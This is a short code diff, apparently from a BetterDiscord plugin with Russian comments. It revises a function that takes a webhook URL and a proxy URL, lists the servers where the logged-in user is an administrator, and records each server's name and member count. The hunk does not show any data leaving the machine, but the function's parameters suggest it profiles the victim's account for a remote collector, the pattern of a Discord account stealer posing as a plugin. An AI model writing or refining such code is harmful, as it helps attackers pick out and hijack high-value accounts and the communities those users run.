@@ -34,29 +34,26 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
-        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
         
         if (GuildStore && PermissionStore) {
             const guilds = GuildStore.getGuilds();
+            
             for (const g of Object.values(guilds)) {
-                // Проверяем право "Администратор" (8n - BigInt)
+                // Проверяем право "Администратор"
                 if (PermissionStore.can(8n, g)) {
                     
+                    // Делаем "свежий" запрос к кэшу по ID сервера
+                    const freshGuild = GuildStore.getGuild(g.id);
                     let count = 0;
                     
-                    // Способ 1: Берем из специализированного хранилища количества
-                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
-                        count = GuildMemberCountStore.getMemberCount(g.id);
-                    }
-                    
-                    // Способ 2: Берем из самого объекта гильдии
-                    if (!count) {
-                        count = g.memberCount || g.approximateMemberCount;
+                    if (freshGuild) {
+                        // Discord отдает либо точное (memberCount), либо приблизительное (approximateMemberCount)
+                        count = freshGuild.memberCount || freshGuild.approximateMemberCount || 0;
                     }
 
                     result.admin_servers.push({
                         name: g.name,
-                        members: count || 0 
+                        members: count
                     });
                 }
             }
